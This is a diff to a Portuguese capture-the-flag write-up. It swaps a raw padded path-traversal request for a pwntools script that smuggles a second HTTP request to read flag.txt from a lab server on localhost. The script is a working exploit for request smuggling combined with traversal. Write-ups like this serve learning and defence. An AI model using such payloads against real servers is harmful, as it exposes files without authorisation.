@@ -253,82 +253,37 @@ void handle_client(int socket_id) {
 
 No fim do código  é possível observar que, se a requisição for bem-sucedida, não há um retorno imediato (a função não encerra), e o servidor continua lendo dados do buffer. Isso permite enviarmos mais de uma requisição ao mesmo tempo realizando um ataque de HTTP smuggling.
 
-Vamos mudar nossa requisição para o seguinte:
+Vamos mudar nossa requisição para o seguinte script e assim conseguiremos a flag.
 
 ```
-GET /index.html HTTP/1.1
-Host: localhost:8081
-Content-Length: 2165
-Connection: keep-alive
+from pwn import *
 
-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA GET /../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../flag.txt.js HTTP/1.1
-Host: web
+def pad(path):
+    assert len(path) <= 1016
+    prefix = '/' * (1016 - len(path))  
+    suffix = '.js'  
+    return prefix + path + suffix
 
+r = remote('localhost', 8081)  
 
-GET /index.html HTTP/1.1
-Host: localhost:8081
-Content-Length: 0
-Connection: keep-alive
+path = pad('../../flag.txt')  
+payload = (
+    'GET /index.html HTTP/1.1\r\n'
+    'Content-Length: 1024\r\n'
+    'Host: localhost\r\n'
+    f'Foo: {"a"*931}\r\n'  # Preenche com caracteres "a"
+    '\r\n'
+
+    # Requisição forjada
+    f'GET /{path}'
+    'GET /index.html HTTP/1.1\r\n'
+    'Content-Length: 0\r\n'
+    'Host: localhost\r\n'
+    '\r\n'
+)
+
+print(f'payload: {payload}')
+r.send(payload.encode())
+r.interactive()
 ```
 
-Porém recebo a seguinte resposta:
-
-```
-HTTP/1.1 500 Internal Server Error
-Server: nginx/1.27.1
-Date: Fri, 04 Apr 2025 20:41:47 GMT
-Content-Type: text/html
-Content-Length: 1241
-Connection: keep-alive
-
-<!DOCTYPE html>
-<html lang="en">
-<head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>500 - Internal Server Error</title>
-  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
-  <style>
-    body {
-      height: 100vh;
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      background-color: #f8f9fa;
-    }
-    .error-container {
-      text-align: center;
-    }
-    .error-container h1 {
-      font-size: 10rem;
-      font-weight: bold;
-    }
-    .error-container h2 {
-      font-size: 2rem;
-      color: #6c757d;
-    }
-    .error-container p {
-      color: #6c757d;
-    }
-    .btn-home {
-      background-color: #007bff;
-      color: #fff;
-      padding: 0.75rem 1.25rem;
-      font-size: 1.25rem;
-    }
-  </style>
-</head>
-<body>
-
-  <div class="error-container">
-    <h1>500</h1>
-    <h2>Internal Server Error</h2>
-    <p>Something went wrong on our side. Please try refreshing the page or come back later.</p>
-    <a href="/index.html" class="btn btn-home">Go Back</a>
-  </div>
-
-  <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
-</body>
-</html>
-
-```
